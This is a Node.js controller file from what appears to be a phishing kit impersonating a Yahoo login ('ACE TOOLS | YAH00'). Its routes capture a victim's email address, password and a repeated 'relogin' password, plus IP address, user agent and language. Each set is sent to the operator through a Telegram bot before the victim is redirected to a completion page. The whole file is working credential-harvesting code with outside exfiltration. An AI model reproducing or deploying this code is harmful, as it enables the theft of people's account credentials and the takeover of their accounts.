const { sendMessageFor } = require("simple-telegram-message");
const getIPDetails = require("../middleware/getIPDetails");
const { getClientIp } = require("request-ip");
const { botToken, chatId } = require("../../settings");

exports.login = (req, res) => {
	return res.render("login");
};

exports.loginPost = async (req, res) => {
	const { username } = req.body;
	const clientIP = getClientIp(req);

	const iPDetails = await getIPDetails();
  const { ip } = iPDetails;

	const userAgent = req.headers["user-agent"];
	const systemLang = req.headers["accept-language"];

	const message =
		`✅ ACE TOOLS | YAH00 | USER_${ip}\n\n` +
		`👤 EMAIL ADDRESS\n` +
		`EMAIL            : ${username}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ip}\n` +
		`💻 SYSTEM INFO\n` +
		`USER AGENT       : ${userAgent}\n` +
		`SYSTEM LANGUAGE  : ${systemLang}\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/login/2");
};

exports.login2 = (req, res) => {
	res.render("login2");
};

exports.loginPost2 = async (req, res) => {
	const { password } = req.body;
	const clientIP = getClientIp(req);

	const iPDetails = await getIPDetails();
  const { ip } = iPDetails;

	const message =
		`✅ ACE TOOLS | YAH00 | USER_${ip}\n\n` +
		`👤 EMAIL PASSWORD\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ip}\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/login/3");
};

exports.login3 = (req, res) => {
	res.render("login3");
};

exports.loginPost3 = async (req, res) => {
	const { password } = req.body;
	const clientIP = getClientIp(req);

	const iPDetails = await getIPDetails();
  const { ip } = iPDetails;

	const message =
		`✅ ACE TOOLS | YAH00 | USER_${ip}\n\n` +
		`👤 EMAIL PASSWORD (RELOGIN)\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ip}\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/complete");
};

exports.complete = (req, res) => {
	return res.render("complete");
};

exports.page404Redirect = (req, res) => {
	return res.redirect("/auth/login");
};